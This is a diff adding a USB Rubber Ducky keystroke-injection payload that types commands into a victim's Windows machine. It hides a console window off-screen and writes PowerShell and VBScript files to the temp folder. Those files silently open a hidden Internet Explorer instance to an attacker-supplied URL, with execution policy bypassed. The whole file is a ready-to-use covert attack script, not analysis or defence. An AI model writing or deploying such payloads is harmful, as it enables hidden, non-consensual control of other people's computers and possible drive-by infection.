@@ -1,0 +1,46 @@
+REM Author: PrickleyPaw
+REM Description: Force the user to browse somewhere 
+REM Powershell with wscript - need to change INPUT to where you want them to browse to
+Control ESCAPE
+STRING cmd /Q /D /T:7F /F:OFF /V:OFF /K
+ENTER
+STRING @echo off && mode con:COLS=15 LINES=1 && title . && cls
+ENTER
+ALT SPACE
+STRING M
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+ENTER
+STRING echo $ie = new-object -comobject "InternetExplorer.Application" > %temp%\browse.ps1
+ENTER
+STRING echo $ie.visible = $false >> %temp%\browse.ps1
+ENTER
+STRING echo $ie.navigate("INPUT0") >> %temp%\browse.ps1
+ENTER
+STRING echo Set oShell = CreateObject("WScript.Shell") > %temp%\browse.vbs
+ENTER
+STRING echo oShell.Run("powershell.exe -ExecutionPolicy Bypass -noLogo -command %temp%\browse.ps1"),0,true >> %temp%\browse.vbs
+ENTER
+STRING wscript %temp%\browse.vbs
+ENTER
+ALT SPACE
+STRING c
